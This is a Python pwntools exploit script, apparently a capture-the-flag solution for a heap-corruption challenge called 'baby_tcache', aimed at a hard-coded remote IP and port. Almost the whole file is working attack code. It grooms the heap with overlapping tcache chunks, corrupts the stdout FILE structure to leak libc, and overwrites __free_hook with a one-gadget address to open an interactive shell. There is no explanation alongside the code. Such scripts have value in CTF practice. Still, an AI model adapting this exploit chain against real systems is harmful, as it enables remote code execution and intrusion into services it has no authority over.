#!/usr/bin/env python
# encoding: utf-8

__author__  = 'b1gtang'

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

BINARY = './baby_tcache'
TARGET = ('52.68.236.186', 56746)

if args.E: # or args.R:
    LIBC64 = './libc.so.6'
else:
    LIBC64 = '/lib/x86_64-linux-gnu/libc.so.6'

if args.R:
    r = remote(TARGET[0], TARGET[1])
else:
    r = process(BINARY, env={'LD_PRELOAD':LIBC64})
    
def attach(addr):
    if addr <= 0x400000:
        addr = addr + 0x555555554000
    gdb.attach(r, gdbscript='b *0x%x' % addr)

def malloc(size, data):
    r.sendlineafter('Your choice:', '1')
    r.sendlineafter('Size:', str(size))
    r.sendafter('Data:', str(data))

def free(idx):
    r.sendlineafter('Your choice:', '2')
    r.sendlineafter('Index:', str(idx))
    
code = ELF(BINARY)
libc = ELF(LIBC64)

# attach(0xeed)

malloc(0xf10, 'x') # 0
malloc(0x410, 'xdd') # 1
malloc(0x80, 'barrier') # 2

# shrink heap
free(0)
malloc(0x108, 'a'*0x108) # 0
malloc(0x80, 'b1') # 3 # unlink
malloc(0x80, 'b2') # 4

# free 3
for i in xrange(5):
    malloc(0x80, 'c') # 5,6,7,8,9

for i in xrange(6):
    free(9-i)

malloc(0x70, 'xdd') # 4 overlap 2

free(2)
free(3)
free(1) # free xdd
free(4)
# leak
malloc(0x980, 'x') # 1
malloc(0x40, '\x60\x07') # 2
malloc(0x80, 'x') # 3
malloc(0x50, 'o'*0x30 + p64(0x90) + p64(0x90) + '\x70\x73') # 4
malloc(0x80, 'x') # 5
malloc(0x80, 'y') # 6
malloc(0x80, p64(0xfbad3c80) + p64(0)*3 + "\x08") #0xfbad2887
libc.address = u64(r.recv(8)) - 0x3ed8b0 
log.info(hex(libc.address))

malloc(0x350, 'x'*0x340+p64(libc.sym['__free_hook'])) # 8 
malloc(0x70, 'x') # 9 
free(2) # 0 
malloc(0x70, p64(libc.address + 0x4f322))
free(3)

r.interactive()
    
